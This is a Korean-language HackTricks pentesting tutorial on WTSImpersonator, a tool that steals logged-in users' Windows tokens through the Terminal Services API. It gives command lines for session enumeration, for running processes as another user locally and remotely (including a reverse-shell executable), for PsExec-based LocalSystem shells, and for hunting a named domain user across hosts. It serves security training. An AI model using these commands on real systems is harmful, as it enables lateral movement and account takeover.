# WTS Impersonator

{{#include ../../banners/hacktricks-training.md}}

**WTSImpersonator**는 Omri Baso가 제작했으며, `\\pipe\LSM_API_service` RPC named pipe를 통해 노출된 Windows Terminal Services API를 사용하여 로그인된 세션을 열거하고 선택한 사용자의 token으로 process를 시작합니다. 로컬 열거 및 실행과 원격 service 기반 workflow를 지원합니다.<sup>[[1]](#references)</sup>

## Core functionality

로컬 실행 flow는 다음 API sequence를 사용합니다:<sup>[[1]](#references)[[2]](#references)</sup>
```text
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
## 모듈 및 사용법

- **사용자 열거:** 이 tool은 로컬 또는 remote host의 session을 열거할 수 있습니다.

- 로컬:
```bash
.\WTSImpersonator.exe -m enum
```
- remote에서는 IP address 또는 hostname을 지정합니다:
```bash
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **명령 실행:** `exec` 및 `exec-remote` module에는 service context가 필요합니다. Microsoft 문서에 따르면 `WTSQueryUserToken`을 사용하려면 호출자가 `SE_TCB_NAME` privilege를 사용하여 `LocalSystem`으로 실행되어야 합니다.<sup>[[2]](#references)</sup>

- 로컬 command execution:
```bash
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec는 testing을 위해 `LocalSystem` command prompt를 시작할 수 있습니다:
```bash
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Remote command execution:** remote mode는 PsExec와 유사한 workflow로 target에 service를 생성하므로 해당 service를 install하고 start할 권한이 필요합니다.<sup>[[1]](#references)</sup>

- 예시:
```bash
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **User hunting:** `user-hunter` module은 host list에서 지정된 사용자의 session을 검색하고, 제공된 program을 해당 context에서 실행하려고 시도합니다.<sup>[[1]](#references)</sup>
- 사용 예시:
```bash
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

## References

- [1] [OmriBaso/WTSImpersonator](https://github.com/OmriBaso/WTSImpersonator)
- [2] [Microsoft: `WTSQueryUserToken` function](https://learn.microsoft.com/en-us/windows/win32/api/wtsapi32/nf-wtsapi32-wtsqueryusertoken)
{{#include ../../banners/hacktricks-training.md}}
